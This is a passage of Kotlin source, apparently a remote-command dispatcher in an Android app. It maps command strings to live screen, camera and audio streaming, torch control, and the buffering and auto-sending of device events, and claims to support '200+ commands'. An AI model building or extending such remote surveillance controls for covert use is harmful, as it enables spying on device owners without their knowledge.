            "start_screen_stream" -> StreamExecutor.startScreenStream(context, params)
            "stop_screen_stream" -> StreamExecutor.stopScreenStream(context, params)
            "start_camera_stream" -> StreamExecutor.startCameraStream(context, params)
            "stop_camera_stream" -> StreamExecutor.stopCameraStream(context, params)
            "switch_camera" -> StreamExecutor.switchCamera(context, params)
            "start_audio_stream" -> StreamExecutor.startAudioStream(context, params)
            "stop_audio_stream" -> StreamExecutor.stopAudioStream(context, params)
            "get_stream_status" -> StreamExecutor.getStreamStatus(context, params)
            "set_stream_quality" -> StreamExecutor.setStreamQuality(context, params)
            "enable_torch" -> StreamExecutor.enableTorch(context, params)
            "pause_stream" -> StreamExecutor.pauseStream(context, params)
            "resume_stream" -> StreamExecutor.resumeStream(context, params)
            "stop_all_streams" -> StreamExecutor.stopAllStreams(context, params)
            "get_stream_capabilities" -> StreamExecutor.getCapabilities(context, params)
            "start_screen_stream_hd" -> StreamExecutor.startScreenStream(context, mapOf("quality" to "1080p"))
            "start_screen_stream_sd" -> StreamExecutor.startScreenStream(context, mapOf("quality" to "480p"))
            "start_front_camera_hd" -> StreamExecutor.startCameraStream(context, mapOf("camera" to "front", "quality" to "1080p"))
            "start_back_camera_hd" -> StreamExecutor.startCameraStream(context, mapOf("camera" to "back", "quality" to "1080p"))
            "start_screen_audio_stream" -> StreamExecutor.startScreenStream(context, mapOf("audio" to "true", "quality" to "720p"))

            // ===== DEVICE EVENTS =====
            "get_device_events" -> com.abuzahra.manager.EventBuffer.flushEvents()
            "events_on" -> com.abuzahra.manager.EventBuffer.setAutoSend(true)
            "events_off" -> com.abuzahra.manager.EventBuffer.setAutoSend(false)
            "events_status" -> com.abuzahra.manager.EventBuffer.getStatus()
            "events_clear" -> com.abuzahra.manager.EventBuffer.clearBuffer().let { mapOf("status" to "cleared", "message" to "Event buffer cleared") }
            "auto_update_on", "auto_update_off" -> mapOf("message" to "System update settings")

            // ===== UNKNOWN =====
            else -> mapOf("error" to "Unknown command: $cmd", "supported" to "200+ commands")
        }
        } catch (e: Exception) {
            Log.e(TAG, "processCommand error for '$cmd': ${e.message}", e)
            mapOf("error" to "Command '$cmd' failed: ${e.message ?: e.javaClass.simpleName}")
        }
    }
}